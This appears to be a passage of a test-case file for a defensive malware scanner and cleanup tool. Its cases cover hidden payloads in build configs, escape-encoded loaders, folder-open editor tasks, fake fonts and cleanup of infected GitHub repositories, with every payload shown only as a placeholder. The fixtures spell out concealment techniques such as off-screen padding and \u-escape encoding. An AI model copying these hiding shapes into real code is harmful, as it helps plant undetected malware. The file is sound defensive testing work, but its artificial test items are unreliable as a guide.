        "findings": [{"level": "ok", "match": "none to known campaign infrastructure"}],
        "must_not_report": NOTHING_FOUND,
    },
)

host_case(
    "host-no-socket-tool-is-said-not-passed",
    why="With neither ss nor netstat there is no connection list, and no "
        "list is not the same as no connections. The section must say it was "
        "skipped and the run must not exit 0 on the strength of it.",
    host=host_state(connections=None, files={"connections.absent": ""}),
    expect={
        "exit": 1,
        "findings": [{"level": "review", "match": "skipped"}],
        "must_not_report": ["[HIT]"],
    },
)

host_case(
    "host-global-hooks-path-is-review",
    why="A global core.hooksPath runs a script in every repository on the "
        "machine, on every commit. Some people set one on purpose, so it is "
        "review; it is never passed over.",
    host=host_state(git_config="user.name=Someone\ncore.hookspath=/home/x/.hooks\n"),
    expect={
        "exit": 1,
        "findings": [{
            "level": "review",
            "match": "global core.hooksPath is set to",
            "path": "/home/x/.hooks",
        }],
        "must_not_report": ["[HIT]"],
    },
)


# ---------------------------------------------------------------------------
# Clean cases. The one command that changes the contents of a source file.
#
# `polinrider clean` strips a payload that was appended to a build config and
# keeps the original in quarantine. It recognises one shape and refuses the
# rest, so half of these are about what it must leave alone.
# ---------------------------------------------------------------------------

CLEAN_CONFIG = "export default { plugins: {} }\n"
INFECTED_CONFIG = CLEAN_CONFIG + "{{PAD}}{{STRONG}}\n"

case(
    "clean-dry-run-shows-the-cut-and-changes-nothing",
    why="Dry run by default holds for clean too, and matters more: this is "
        "the command that edits source. Without --apply it shows the last "
        "line it would keep and the start of what it would cut, and the tree "
        "is byte for byte what it was.",
    command="clean",
    roots=["code"],
    files={"code/proj/postcss.config.mjs": INFECTED_CONFIG},
    expect={
        "exit": 2,
        "tree_may_change": False,
        "findings": [{
            "level": "HIT",
            "match": "config file contains an indicator",
            "path": "postcss.config.mjs",
        }],
        "must_print": ["would strip", "keeps through line 1",
                       "WHAT TO DO NEXT", "polinrider clean --apply",
                       "Decide whether this machine needs rebuilding"],
        "must_not_print": ["original kept ->"],
    },
)

case(
    "clean-strips-a-payload-appended-on-its-own-line",
    why="The canonical infection, undone. The module is kept whole, the "
        "padding and the payload go, and the infected original is in "
        "quarantine so the change can be put back. Exit 2, because the exit "
        "code reports what was found, and a confirmed indicator was.",
    command="clean",
    apply=True,
    roots=["code"],
    files={"code/proj/postcss.config.mjs": INFECTED_CONFIG},
    expect={
        "exit": 2,
        "tree_may_change": True,
        "stripped": ["code/proj/postcss.config.mjs"],
        "file_after": {"code/proj/postcss.config.mjs": CLEAN_CONFIG},
        "must_print": ["stripped", "original kept ->"],
    },
)

case(
    "clean-strips-a-payload-on-the-module-line",
    why="The form that hides best: the padding follows the closing bracket "
        "on the same line and pushes the payload off the edge of the editor. "
        "The cut must leave that line intact and ended.",
    command="clean",
    apply=True,
    roots=["code"],
    files={
        "code/proj/next.config.js":
            "module.exports = { reactStrictMode: true };{{PAD}}{{STRONG}}\n",
    },
    expect={
        "exit": 2,
        "tree_may_change": True,
        "stripped": ["code/proj/next.config.js"],
        "file_after": {
            "code/proj/next.config.js": "module.exports = { reactStrictMode: true };\n",
        },
    },
)

UNCOMMITTED = (
    "import tailwind from 'tailwindcss'\n"
    "\n"
    "// half-finished: trying the new plugin order\n"
    "const extra = [1, 2, 3]\n"
    "\n"
    "export default {\n"
    "  plugins: [tailwind, ...extra],\n"
    "}\n"
)

case(
    "clean-keeps-uncommitted-work-and-never-touches-git",
    why="The reason this command exists. The alternative is 'delete the clone "
        "and re-clone', which throws away whatever was not pushed. Work in "
        "the infected file itself survives byte for byte, other files are "
        "not opened for writing, and nothing under .git changes: no pull, no "
        "reset, no stash, no staging. A cleanup tool that runs git inside a "
        "repository an attacker wrote to is taking orders from its config.",
    command="clean",
    apply=True,
    roots=["code"],
    files={
        "code/proj/postcss.config.mjs": UNCOMMITTED + "{{PAD}}{{STRONG}}\n",
        "code/proj/src/draft.js": "// not committed yet\nexport const wip = true\n",
        "code/proj/.git/HEAD": "ref: refs/heads/main\n",
        "code/proj/.git/index": "DIRC fixture bytes, never parsed\n",
        "code/proj/.git/config": "[core]\n\tbare = false\n",
    },
    expect={
        "exit": 2,
        "tree_may_change": True,
        "stripped": ["code/proj/postcss.config.mjs"],
        "file_after": {
            "code/proj/postcss.config.mjs": UNCOMMITTED,
            "code/proj/src/draft.js": "// not committed yet\nexport const wip = true\n",
            "code/proj/.git/HEAD": "ref: refs/heads/main\n",
            "code/proj/.git/index": "DIRC fixture bytes, never parsed\n",
            "code/proj/.git/config": "[core]\n\tbare = false\n",
        },
        "must_print": ["It does not touch git"],
    },
)

case(
    "clean-refuses-a-payload-inside-the-module",
    why="Appended is the only shape it cuts. Here the payload sits inside "
        "the object literal with the project's own code after it, and "
        "cutting to the end of the file would take that code too. A cleanup "
        "that breaks the build has made the incident worse. Reported, not "
        "edited, even under --apply.",
    command="clean",
    apply=True,
    roots=["code"],
    files={
        "code/proj/vite.config.js":
            "module.exports = {{{PAD}}{{STRONG}}\n  plugins: [],\n}\n",
    },
    expect={
        "exit": 2,
        "tree_may_change": False,
        "findings": [{
            "level": "HIT",
            "match": "config file contains an indicator",
            "path": "vite.config.js",
        }],
        "must_print": ["not stripped", "re-clone"],
        "must_not_print": ["original kept ->"],
    },
)

case(
    "clean-refuses-a-payload-that-is-not-behind-padding",
    why="An indicator on a line of its own after the module may well be a "
        "payload. It is not the shape this campaign is known to use, and "
        "editing somebody's source on a guess is not something a tool that "
        "asks to be trusted mid-incident gets to do. It says why and leaves "
        "the file.",
    command="clean",
    apply=True,
    roots=["code"],
    files={"code/proj/eslint.config.mjs": "export default []\nvar x = '{{STRONG}}'\n"},
    expect={
        "exit": 2,
        "tree_may_change": False,
        "must_print": ["not stripped", "not behind the padding"],
    },
)

# ---------------------------------------------------------------------------
# Escaped loaders (ADR-0040). One loader family writes every character as a
# \uXXXX escape, so the file does not contain the indicator and a fixed-string
# match finds nothing in it. {{STRONG_U}} is that spelling.
# ---------------------------------------------------------------------------

ESCAPED_CONFIG = CLEAN_CONFIG + "{{PAD}}global.i='{{STRONG_U}}';\n"

# Ordinary text written with escapes, as translations and minified bundles
# are. Nothing in it decodes to an indicator.
ORDINARY_ESCAPES = (
    "// caf\\u00e9, na\\u00efve, \\u00fcber, \\x41\\x42\\x43, \\u{1F600}\n"
    "export const labels = { yes: 'S\\u00ed', no: 'N\\u00e3o', sep: '\\x2c' }\n"
)

case(
    "escaped-loader-in-a-build-config-is-found",
    why="The 5 October review found 18 of 35 confirmed repositories carrying "
        "a loader written entirely in \\u escapes. Node decodes it to the "
        "same string the indicator set holds, so it is the same infection and "
        "has to get the same answer: a confirmed hit and exit 2. Matching only "
        "the bytes as written would call it clean.",
    roots=["code"],
    files={
        "code/proj/postcss.config.mjs": ESCAPED_CONFIG,
        "code/proj/src/index.js": "export const hello = () => 'world'\n",
    },
    expect={
        "exit": 2,
        "findings": [{
            "level": "HIT",
            "match": "config file contains an indicator",
            "path": "postcss.config.mjs",
        }],
        "must_not_report": ["src/index.js"],
    },
)

case(
    "escaped-indicator-in-a-folder-open-task-is-found",
    why="A tasks.json is JSON, and JSON lets any character in a string be a "
        "\\u escape. The editor decodes the command before it runs it, so a "
        "task whose command is the indicator in escapes, and whose folderOpen "
        "is too, runs exactly what the plain one runs. Confirmed, not review.",
    roots=["code"],
    files={
        "code/proj/.vscode/tasks.json":
            '{"tasks":[{"runOptions":{"runOn":"\\u0066olderOpen"},'
            '"command":"{{STRONG_U}}"}]}\n',
    },
    expect={
        "exit": 2,
        "findings": [{
            "level": "HIT",
            "match": "runs on folder open AND contains an indicator",
            "path": "tasks.json",
        }],
    },
)

case(
    "ordinary-escapes-are-not-an-indicator",
    why="Decoding has to cost nothing in false positives. Accented words, "
        "emoji and hex escapes are everywhere in real code, in configs and in "
        "manifests. Decoded, none of them is an indicator, so the tree is "
        "clean and exits 0 with no review line.",
    roots=["code"],
    files={
        "code/proj/vite.config.js": ORDINARY_ESCAPES + "export default { plugins: [] }\n",
        "code/proj/package.json":
            '{"name":"proj","description":"caf\\u00e9 \\u00fcber",'
            '"dependencies":{"react":"^18.0.0"}}\n',
        "code/proj/src/i18n.js": ORDINARY_ESCAPES,
    },
    expect={
        "exit": 0,
        "findings": [{"level": "ok", "match": "build config files checked"}],
        "must_not_report": ["[HIT]"],
    },
)

case(
    "clean-refuses-a-payload-written-in-escape-codes",
    why="It is behind the padding after the module, the shape clean cuts. "
        "But the indicator is only there once the escapes are decoded, so "
        "there is no offset in the file to cut from, and a cut worked out on "
        "the decoded copy would be applied to bytes that are not the same "
        "length. It is still confirmed, it says why it was not stripped, and "
        "the file is left byte for byte as it was.",
    command="clean",
    apply=True,
    roots=["code"],
    files={"code/proj/vite.config.js": ESCAPED_CONFIG},
    expect={
        "exit": 2,
        "tree_may_change": False,
        "findings": [{
            "level": "HIT",
            "match": "config file contains an indicator",
            "path": "vite.config.js",
        }],
        "file_after": {"code/proj/vite.config.js": ESCAPED_CONFIG},
        "must_print": [
            "not stripped",
            "the indicator is written in escape codes, so the payload cannot be located in the file to cut",
            "re-clone",
        ],
        "must_not_print": ["original kept ->", "would strip"],
    },
)

case(
    "clean-quarantines-what-check-would",
    why="clean is check plus one thing, not a different scanner. A fake font "
        "in the same repository is moved to quarantine exactly as "
        "check --apply moves it.",
    command="clean",
    apply=True,
    roots=["code"],
    files={
        "code/proj/postcss.config.mjs": INFECTED_CONFIG,
        "code/proj/public/fake.woff2": FAKE_FONT,
    },
    expect={
        "exit": 2,
        "tree_may_change": True,
        "stripped": ["code/proj/postcss.config.mjs"],
        "quarantined": ["code/proj/public/fake.woff2"],
        "findings": [{"level": "HIT", "match": "font file is not a font"}],
    },
)

case(
    "check-apply-still-never-edits-a-file",
    why="ADR-0031 adds a command; it does not change what an existing one "
        "means. check --apply moves confirmed artifacts and never rewrites "
        "the contents of anything. An infected config is reported and left "
        "exactly as it was, under both implementations.",
    apply=True,
    roots=["code"],
    files={"code/proj/postcss.config.mjs": INFECTED_CONFIG},
    expect={
        "exit": 2,
        "tree_may_change": False,
        "findings": [{
            "level": "HIT",
            "match": "config file contains an indicator",
            "path": "postcss.config.mjs",
        }],
        "must_not_print": ["original kept ->", "stripped "],
    },
)


# ---------------------------------------------------------------------------
# Guide cases. A whole session, driven by its answers.
#
# `stdin` is what the operator types, one answer per line. {{TREE}} is the
# fixture tree. Answers are words, never numbers. What these pin is the promise
# on the first screen: nothing will be changed unless you type yes.
# ---------------------------------------------------------------------------

FOLDER = ["folder", "{{TREE}}/code", ""]     # a folder, this one, start

case(
    "guide-strips-only-after-an-explicit-yes",
    why="The whole flow in one session: choose a folder, see a summary of "
        "what was found, type yes, and it is stripped with the original kept, "
        "then checked again. Exit 2 although the files end clean, because the "
        "session found a confirmed indicator and a script reading the exit "
        "code must not be told nothing happened.",
    command="guide",
    apply=True,
    roots=["code"],
    stdin=FOLDER + ["yes", ""],
    files={"code/proj/postcss.config.mjs": INFECTED_CONFIG},
    expect={
        "exit": 2,
        "tree_may_change": True,
        "stripped": ["code/proj/postcss.config.mjs"],
        "file_after": {"code/proj/postcss.config.mjs": CLEAN_CONFIG},
        "must_print": ["STEP 3 OF 4", "Done.", "stripped   ", "Checked again.",
                       "STEP 4 OF 4", "from a DIFFERENT computer"],
    },
)

case(
    "guide-changes-nothing-without-a-yes",
    why="Enter is not yes. 'sure' is not yes. Each asks again, and no leaves "
        "the tree byte for byte as it was. A prompt that treats anything "
        "short of no as consent will one day be answered by a stray keypress.",
    command="guide",
    roots=["code"],
    stdin=FOLDER + ["", "sure", "no", ""],
    files={"code/proj/postcss.config.mjs": INFECTED_CONFIG},
    expect={
        "exit": 2,
        "tree_may_change": False,
        "must_print": ["Type yes, no or details", "Left as it is",
                       "you left in place"],
        "must_not_print": ["Done.", "stripped   ", "Checked again."],
    },
)

case(
    "guide-summary-first-and-details-on-request",
    why="Somebody who has just been told they are infected is not reading a "
        "list of sections. The screen says how many, what kind and what it "
        "means, in plain words and with no path. The full list is one word "
        "away, and asking for it changes nothing.",
    command="guide",
    roots=["code"],
    stdin=FOLDER + ["details", "no", ""],
    files={
        "code/proj/postcss.config.mjs": INFECTED_CONFIG,
        "code/proj/public/fake.woff2": FAKE_FONT,
    },
    expect={
        "exit": 2,
        "tree_may_change": False,
        "must_print": [
            "CONFIRMED   2",
            "1 config file with the payload hidden in it",
            "1 font file that is really a script",
            "I can deal with 2 of the 2 now:",
            "config file contains an indicator",
            "font file is not a font",
        ],
        "must_not_report": NOTHING_FOUND,
    },
)

case(
    "guide-stops-safely-when-input-ends",
    why="Input can end mid-session: a closed terminal, a pipe that ran dry. "
        "The end of input is not an empty line and is certainly not a yes. "
        "The session stops where it is, changes nothing further and says so. "
        "The shell version once read its own scan data as the answer to a "
        "prompt (ADR-0024); here running out of answers can only ever stop.",
    command="guide",
    roots=["code"],
    stdin=FOLDER,
    files={"code/proj/postcss.config.mjs": INFECTED_CONFIG},
    expect={
        "exit": 2,
        "tree_may_change": False,
        "must_print": ["Input ended"],
        "must_not_print": ["Done.", "stripped   "],
    },
)

case(
    "guide-quit-before-a-check-is-not-a-clean-result",
    why="Leaving at the first question checked nothing. Exit 0 would tell a "
        "script the machine is clean; exit 3 says the check did not run, "
        "which is what happened.",
    command="guide",
    roots=["code"],
    stdin=["q"],
    files={"code/proj/postcss.config.mjs": INFECTED_CONFIG},
    expect={
        "exit": 3,
        "tree_may_change": False,
        "must_print": ["Nothing was checked"],
    },
)

case(
    "guide-clean-folder-never-asks-to-change-anything",
    why="With nothing found there is nothing to consent to, so the question "
        "is never put. A clean folder goes straight to the last screen and "
        "exits 0.",
    command="guide",
    roots=["code"],
    stdin=FOLDER,
    files=ORDINARY_TREE,
    expect={
        "exit": 0,
        "tree_may_change": False,
        "must_print": ["NOTHING FOUND", "STEP 4 OF 4"],
        "must_not_print": ["Type yes"],
        "must_not_report": NOTHING_FOUND,
    },
)

case(
    "guide-a-number-is-not-an-answer",
    why="The first version asked people to type 1 or 2. A digit is easy to "
        "mistype and says nothing about what was chosen. Answers are the "
        "words on the screen, in any case, and anything else asks again "
        "without doing anything.",
    command="guide",
    roots=["code"],
    stdin=["1", "2", "FOLDER", "{{TREE}}/code", ""],
    files=ORDINARY_TREE,
    expect={
        "exit": 0,
        "tree_may_change": False,
        "must_print": ["Type computer, folder, organization, account or everything", "NOTHING FOUND"],
        "must_not_print": ["Type 1 or 2"],
    },
)

host_case(
    "guide-this-computer-offers-only-what-it-can-do",
    why="A running implant cannot be moved into quarantine. The flow names "
        "it in plain words, says that nothing here can be fixed for you, and "
        "does not put a yes or no question that has no yes. The last screen "
        "puts the network first and says to rebuild, because a running "
        "program is proof the payload ran.",
    command="guide",
    stdin=["computer", "{{TREE}}/code", "", ""],
    host=host_state(processes="4242\t{{IMPLANT_CUT}}\t/home/x/.local/share/{{IMPLANT}}\n"),
    expect={
        "exit": 2,
        "tree_may_change": False,
        "must_print": [
            "1 program from the payload running right now",
            "A running program means the payload has run on this computer.",
            "None of these can be fixed for you.",
            "Disconnect from the network, now",
            "Rebuild this computer from a clean install",
        ],
        "must_not_print": ["Type yes"],
    },
)


# ---------------------------------------------------------------------------
# GitHub cases. An organization, as data.
#
# `forge` is owners, their repositories, branches and files; the runner builds
# real git repositories from it. `forge_files` holds who is signed in and the
# list of organizations. The first group pins checking and reporting, which
# changes nothing on GitHub. The second pins the fixes, which do.
# ---------------------------------------------------------------------------

SIGNED_IN = {"whoami": "tester\n", "orgs": "acme\t2\nacme-labs\t7\n"}

case(
    "guide-organization-is-listed-checked-and-summarised",
    why="The whole read-only GitHub path. The organizations are listed so "
        "nobody types a name from memory, every branch is checked and not "
        "only the default one, and the summary names the repository, how many "
        "branches and who pushed. A pusher's name is never used to discount "
        "a finding: the payload pushes as whoever is logged in, so a "
        "colleague's name is what an attack looks like.",
    command="guide",
    roots=["code"],
    files=ORDINARY_TREE,
    stdin=["organization", "ACME", "none"],
    forge_files=SIGNED_IN,
    forge={"acme": {
        "blog": {"branches": {"main": {"index.md": "hello\n"}}},
        "shop": {
            "branches": {
                "main": {"src/index.js": "export const a = 1\n"},
                "release": {"postcss.config.mjs": INFECTED_CONFIG},
            },
            "pushes": "refs/heads/release\taaa\tbbb\talice\t2026-09-12T10:00:00Z\t0\n"
                      "refs/heads/release\tbbb\tccc\tbob\t2026-09-13T10:00:00Z\t1",
        },
    }},
    expect={
        "exit": 2,
        "tree_may_change": False,
        "must_print": [
            "Signed in to GitHub as tester.",
            "Your organizations:",
            "This only reads. Nothing on GitHub is changed.",
            "2 of 2",
            "Checked 2 repositories and 3 branches of acme.",
            "CONFIRMED   1     repository carries the PolinRider payload",
            "acme/shop   1 branch",
            "alice, bob",
            "Their computers need checking too.",
            "Check the computers of alice and bob",
        ],
    },
)

case(
    "guide-github-finds-a-payload-written-in-escape-codes",
    why="git grep -F against the indicator set finds nothing in a loader "
        "written in \\u escapes. The remote check lists the files that hold "
        "an escape, reads them and matches them decoded, so the branch is "
        "confirmed the same as the plain payload is. A file of ordinary "
        "escapes on another repository is read the same way and is clean.",
    command="guide",
    roots=["code"],
    files=ORDINARY_TREE,
    stdin=["organization", "acme", "none"],
    forge_files=SIGNED_IN,
    forge={"acme": {
        "blog": {"branches": {"main": {"src/i18n.js": ORDINARY_ESCAPES}}},
        "shop": {
            "branches": {
                "main": {"src/index.js": "export const a = 1\n"},
                "release": {"vite.config.js": ESCAPED_CONFIG},
            },
            "pushes": "refs/heads/release\taaa\tbbb\talice\t2026-09-12T10:00:00Z\t0",
        },
    }},
    expect={
        "exit": 2,
        "tree_may_change": False,
        "must_print": [
            "Checked 2 repositories and 3 branches of acme.",
            "CONFIRMED   1     repository carries the PolinRider payload",
            "acme/shop   1 branch",
        ],
        "must_not_print": ["acme/blog   1 branch"],
    },
)

case(
    "guide-github-reads-package-names-from-manifests",
    why="On GitHub every file is searched, and git grep -F for a campaign "
        "package name also finds it inside a longer, legitimate name and in "
        "a description. Each file it finds is read again: a manifest for the "
        "names it installs, so a repository depending on a longer package "
        "that begins with a campaign name is clean, and one that installs "
        "the campaign package is confirmed (ADR-0041).",
    command="guide",
    roots=["code"],
    files=ORDINARY_TREE,
    stdin=["organization", "acme", "none"],
    forge_files=SIGNED_IN,
    forge={"acme": {
        "blog": {"branches": {"main": {
            "package.json": '{"name":"blog","description":"not {{BADPKG}}",'
                            '"dependencies":{"{{BADPKG}}-utils":"^2.0.0"}}\n',
        }}},
        "shop": {
            "branches": {
                "main": {"src/index.js": "export const a = 1\n"},
                "release": {"package.json": '{"name":"shop","dependencies":{"{{BADPKG}}":"^1.0.0"}}\n'},
            },
            "pushes": "refs/heads/release\taaa\tbbb\talice\t2026-09-12T10:00:00Z\t0",
        },
    }},
    expect={
        "exit": 2,
        "tree_may_change": False,
        "must_print": [
            "Checked 2 repositories and 3 branches of acme.",
            "CONFIRMED   1     repository carries the PolinRider payload",
            "acme/shop   1 branch",
        ],
        "must_not_print": ["acme/blog   1 branch"],
    },
)

case(
    "guide-github-sign-in-is-settled-first",
    why="A check that fails half way down a list of repositories is worse "
        "than one that never started. If gh, GitHub's own CLI, is not "
        "installed, the flow says exactly what to install and how to sign in, "
        "and checks again on Enter. Leaving from there has checked nothing, "
        "so the exit code is 3 and not 0.",
    command="guide",
    roots=["code"],
    files=ORDINARY_TREE,
    stdin=["organization", "", "q"],
    forge_files={"whoami.absent": ""},
    expect={
        "exit": 3,
        "tree_may_change": False,
        "must_print": [
            "To check GitHub I use gh, GitHub's own CLI.",
            "It is not installed on this computer.",
            "gh auth login",
            "Nothing was checked",
        ],
        "must_not_print": ["Which organization?"],
    },
)

case(
    "guide-a-repository-that-could-not-be-copied-is-not-clean",
    why="A repository that would not clone was never checked. Leaving it out "
        "and reporting clean covers less than the operator believes. It is "
        "named, the result says what could be checked was clean, and the "
        "exit code is 3.",
    command="guide",
    roots=["code"],
    files=ORDINARY_TREE,
    stdin=["organization", "acme"],
    forge_files=SIGNED_IN,
    forge={"acme": {
        "blog": {"branches": {"main": {"index.md": "hello\n"}}},
        "ghost": {"missing": True},
    }},
    expect={
        "exit": 3,
        "tree_may_change": False,
        "must_print": [
            "1 repository could not be copied and was NOT checked.",
            "Nothing found in what could be checked.",
            "acme/ghost",
        ],
    },
)

case(
    "guide-own-detection-files-are-not-the-payload",
    why="A scanner and an incident write-up hold the same strings the "
        "malware does. A branch flagged only for the operator's own detection "
        "workflow and documentation is set aside and said to be. The same "
        "string in ordinary source is confirmed, whatever its directory is "
        "called: 1.x discounted everything under lib/ and ci/, in anybody's "
        "repository.",
    command="guide",
    roots=["code"],
    files=ORDINARY_TREE,
    stdin=["organization", "acme", "details", "none"],
    forge_files=SIGNED_IN,
    forge={"acme": {
        "infra": {"branches": {"main": {
            ".github/workflows/polinrider-scan.yml": "run: grep '{{STRONG}}' -r .\n",
            "docs/incident.md": "We found {{STRONG}} in three repositories.\n",
        }}},
        "api": {"branches": {"main": {"lib/vendor.js": "var a = '{{STRONG}}'\n"}}},
    }},
    expect={
        "exit": 2,
        "tree_may_change": False,
        "must_print": [
            "CONFIRMED   1",
            "1 branch matched only your own detection files and was set aside.",
            "acme/api   main",
            "lib/vendor.js",
        ],
    },
)

# ---------------------------------------------------------------------------
# GitHub fixes. These push, to the pretend GitHub.
#
# `attacks` are pushes made after a repository existed: the runner makes each
# one for real and records it as GitHub would, with the commit the branch
# pointed to before. `forge_after` says what a repository must hold when the
# run is over. A repository it does not name must be exactly as it was.
# ---------------------------------------------------------------------------

# shop was clean. alice's push replaced the newest commit with one carrying
# the payload and CLAIMING an old date, then bob pushed from an infected clone.
ATTACKED_SHOP = {
    "branches": {"main": {"postcss.config.mjs": CLEAN_CONFIG,
                          "README.md": "# Shop\n\nnpm install, then npm start.\n"}},
    "attacks": [
        {"branch": "main", "force": True, "date": "2019-03-01T12:00:00Z",
         "actor": "alice", "at": "2026-09-11T09:14:00Z",
         "files": {"postcss.config.mjs": INFECTED_CONFIG}},
        {"branch": "main", "actor": "bob", "at": "2026-09-12T16:40:00Z",
         "files": {"src/feature.js": "export const feature = true\n"}},
    ],
}

case(
    "guide-github-restore-follows-the-push-record-not-commit-dates",
    why="The cleanest fix moves a branch back to where it was before the "
        "attack and edits nothing. Where that was cannot be read from the "
        "commits: this campaign backdates them, and here the infected commit "
        "claims to be from 2019, older than the clean one it replaced. It is "
        "read from GitHub's own record of each push, which holds the commit "
        "the branch pointed to before. The commit before bob's push carries "
        "the payload, so it is an earlier wave and is skipped; the one "
        "before alice's is reachable from no branch, is fetched by ID, "
        "checks clean, and is the target. Nothing moves before the dry run "
        "and a typed yes, and the result is said from what GitHub shows.",
    command="guide",
    roots=["code"],
    files=ORDINARY_TREE,
    stdin=["organization", "acme", "fix", "restore", "yes", ""],
    forge_files=SIGNED_IN,
    forge={"acme": {"shop": ATTACKED_SHOP}},
    expect={
        "exit": 2,
        "tree_may_change": False,
        "must_print": [
            "Record found. Commit",
            "This would change, on GitHub:",
            "undoes the push of 11 September by alice",
            "2 commits pushed since then stop being reachable.",
            "Nothing has been pushed yet.",
            "Done. 1 branch of acme/shop put back.",
            "Checked on GitHub afterwards: it matches.",
            "The repository is fixed.",
            "Delete old clones and clone again",
        ],
        "forge_after": {"acme/shop": {
            "clean": ["main"],
            "file": {"refs/heads/main:postcss.config.mjs": CLEAN_CONFIG},
        }},
    },
)

case(
    "guide-github-nothing-is-pushed-without-a-typed-yes",
    why="The rule of the whole flow, where it matters most: this half "
        "rewrites other people's repositories. Enter is not yes, a near miss "
        "is not yes, and no backs out to the choice of fix. After three "
        "dry runs and a skip, every branch on GitHub is exactly where it "
        "was. The runner checks that for any repository a case does not "
        "say may change.",
    command="guide",
    roots=["code"],
    files=ORDINARY_TREE,
    stdin=["organization", "acme", "fix",
           "restore", "", "sure", "no",
           "erase", "y", "no",
           "archive", "YES please", "no",
           "skip"],
    forge_files=SIGNED_IN,
    forge={"acme": {"shop": ATTACKED_SHOP}},
    expect={
        "exit": 2,
        "tree_may_change": False,
        "must_print": [
            "Nothing has been pushed yet.",
            "Type yes or no. Enter is not yes. q quits.",
            "Nothing was changed.",
            "1 repository on GitHub carries the payload.",
            "Fix acme/shop, which still carries the payload",
        ],
        "must_not_print": ["Pushing to GitHub", "Done."],
    },
)

case(
    "guide-github-input-that-ends-is-not-a-yes",
    why="A terminal that closes, or a pipe that runs dry, at the question "
        "that would rewrite a repository's whole history. Input ending is "
        "never read as an answer, least of all as yes.",
    command="guide",
    roots=["code"],
    files=ORDINARY_TREE,
    stdin=["organization", "acme", "fix", "erase"],
    forge_files=SIGNED_IN,
    forge={"acme": {"shop": ATTACKED_SHOP}},
    expect={
        "exit": 2,
        "tree_may_change": False,
        "must_print": ["Nothing has been pushed yet."],
        "must_not_print": ["Rewriting the history", "Done."],
    },
)

case(
    "guide-github-restore-is-not-offered-onto-an-earlier-wave",
    why="The commit before the newest hostile push is often the previous "
        "wave of the same attack. Here every state GitHub remembers carries "
        "the payload, so there is nothing clean to go back to. restore is "
        "left off the screen with the reason, typing it anyway is refused, "
        "and the repository is not touched. Restoring to the commit before "
        "the last push, as a tool that trusted the record blindly would, "
        "puts the payload straight back and reports a fix.",
    command="guide",
    roots=["code"],
    files=ORDINARY_TREE,
    stdin=["organization", "acme", "fix", "restore", "skip"],
    forge_files=SIGNED_IN,
    forge={"acme": {"site": {
        "branches": {"main": {"vite.config.js": INFECTED_CONFIG}},
        "attacks": [{"branch": "main", "actor": "alice", "at": "2026-09-12T10:00:00Z",
                     "files": {"next.config.js": INFECTED_CONFIG}}],
    }}},
    expect={
        "exit": 2,
        "tree_may_change": False,
        "must_print": [
            "restore is not possible here:",
            "every earlier state GitHub remembers carries the payload",
            "restore is not possible for this repository.",
        ],
        "must_not_print": ["Record found", "Done."],
    },
)

case(
    "guide-github-erase-takes-the-payload-out-of-every-commit",
    why="When there is no record to restore from, the history is rewritten "
        "without the payload. Every commit means every commit: the payload "
        "here also sat in old/vendor.js, a file since overwritten, so it is "
        "in the history and not in the newest commit, and a rewrite that "
        "only removed what the newest commit shows would leave it there "
        "and say it was gone. The build config is not lost with the "
        "payload: its clean part is put back. Afterwards the screen says "
        "how to bring an existing clone into line, because a pull from an "
        "old clone pushes the payload back.",
    command="guide",
    roots=["code"],
    files=ORDINARY_TREE,
    stdin=["organization", "acme", "fix", "erase", "yes", ""],
    forge_files=SIGNED_IN,
    forge={"acme": {"shop": {
        "branches": {"main": {"postcss.config.mjs": CLEAN_CONFIG}},
        "attacks": [
            {"branch": "main", "files": {"old/vendor.js": "var a = '{{STRONG}}'\n"}},
            {"branch": "main", "files": {"old/vendor.js": "var a = 1\n"}},
            {"branch": "main", "files": {"postcss.config.mjs": INFECTED_CONFIG}},
        ],
    }}},
    expect={
        "exit": 2,
        "tree_may_change": False,
        "must_print": [
            "restore is not possible here:",
            "2 files are taken out of every commit:",
            "old/vendor.js",
            "Every commit gets a new ID: 5 in all.",
            "The clean part of each build config is put back,",
            "Done. The payload is out of the history of acme/shop.",
            "Every existing clone of acme/shop now needs updating.",
            "git reset --hard origin/main",
            "Do not git pull, merge or push from the old history",
            "Ask GitHub Support to clear the old commits",
        ],
        "forge_after": {"acme/shop": {
            "clean": ["main"],
            "history": "clean",
            "file": {"refs/heads/main:postcss.config.mjs": CLEAN_CONFIG,
                     "refs/heads/main:BASE.txt": "base\n"},
        }},
    },
)

case(
    "guide-github-remove-adds-a-commit-and-rewrites-nothing",
    why="The gentlest fix: one ordinary commit per branch, which can be "
        "reverted. The payload is cut out of the build config and the "
        "config stays, where 1.x deleted the whole file and left a project "
        "that no longer built. What it does not do is said before the "
        "question and not after: the payload is still in older commits, "
        "and the case holds the tool to that by requiring the history to "
        "still carry it.",
    command="guide",
    roots=["code"],
    files=ORDINARY_TREE,
    stdin=["organization", "acme", "fix", "remove", "yes", ""],
    forge_files=SIGNED_IN,
    forge={"acme": {"shop": ATTACKED_SHOP}},
    expect={
        "exit": 2,
        "tree_may_change": False,
        "must_print": [
            "one new commit",
            "cuts the payload out of postcss.config.mjs",
            "The payload stays in older commits: anyone who checks",
            "Done. The payload is out of 1 branch of acme/shop.",
            "Pull the fix into every clone, once its computer is checked",
        ],
        "forge_after": {"acme/shop": {
            "clean": ["main"],
            "history": "infected",
            "file": {"refs/heads/main:postcss.config.mjs": CLEAN_CONFIG,
                     "refs/heads/main:src/feature.js": "export const feature = true\n"},
        }},
    },
)

case(
    "guide-github-archive-puts-the-notice-on-top-and-removes-nothing",
    why="For a repository nobody uses any more. The notice goes at the very "
        "top of the README, as a heading so that it is the largest thing on "
        "the page, and everything the README held before is still there "
        "beneath it. The description is replaced and the repository is made "
        "read-only. It does not clean anything, and the screen says so "
        "before the question: the payload stays, which the case checks.",
    command="guide",
    roots=["code"],
    files=ORDINARY_TREE,
    stdin=["organization", "acme", "fix", "archive", "yes", ""],
    forge_files=SIGNED_IN,
    forge={"acme": {"shop": ATTACKED_SHOP}},
    expect={
        "exit": 2,
        "tree_may_change": False,
        "must_print": [
            "A notice is added to the top of README.md, as one",
            "Nothing in the file is removed.",
            "INFECTED with PolinRider malware. Do not clone or use.",
            "The payload stays inside it. Anyone who clones it still",
            "# INFECTED WITH MALWARE. DO NOT CLONE, OPEN OR BUILD THIS REPOSITORY.",
            "> [!CAUTION]",
            "September 2026**,",
            "Type yes to archive acme/shop.",
            "Done. acme/shop is archived,",
            "No repository is fixed yet. 1 archived.",
        ],
        "forge_after": {"acme/shop": {
            "infected": ["main"],
            "archived": True,
            "readme_top": "# INFECTED WITH MALWARE. DO NOT CLONE, OPEN OR BUILD THIS REPOSITORY.",
            "readme_keeps": "npm install, then npm start.",
        }},
    },
)

TWO_ATTACKED = {
    "shop": ATTACKED_SHOP,
